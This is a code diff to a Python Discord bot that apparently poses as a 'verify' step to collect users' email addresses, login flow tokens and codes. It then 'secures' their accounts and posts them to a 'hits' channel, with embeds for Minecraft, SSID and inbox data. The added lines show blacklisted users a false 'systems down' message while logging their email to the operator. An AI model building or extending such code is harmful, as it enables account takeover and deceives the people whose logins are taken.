@@ -1,5 +1,6 @@
+from database.database import DBConnection
 from urllib.parse import quote
-from discord import ui
+from discord import ui, Embed
 import datetime
 import discord
 import json
@@ -25,6 +26,29 @@ class MyModalTwo(ui.Modal):
         print(f"Usernameo: {self.username}")
         logs_channel = await interaction.client.fetch_channel(self.config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(self.config["discord"]["accounts_channel"])
+
+        # Blacklisted Users
+        with DBConnection() as database:
+            if interaction.user.id in database.getBlacklistedUsers():
+                await interaction.response.send_message(
+                    embed = Embed(
+                        title = "Could not verify",
+                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
+                        color = 0xFF5C5C
+                    ), 
+                    ephemeral = True
+                )
+
+                await logs_channel.send(
+                    embed = Embed(
+                        title = f"User | {interaction.user.name} ({interaction.user.id})",
+                        description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
+                        timestamp = datetime.datetime.now(),
+                        colour = 0xFF5C5C                         
+                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
+                    view = ButtonOptions(interaction.user)
+                )
+                return
 
         embed = discord.Embed(
             title = f"User | {interaction.user.name}",
@@ -53,6 +77,7 @@ class MyModalTwo(ui.Modal):
 
         self.session = getSession()
 
+        # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
         securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
         
         if not securedAccount:
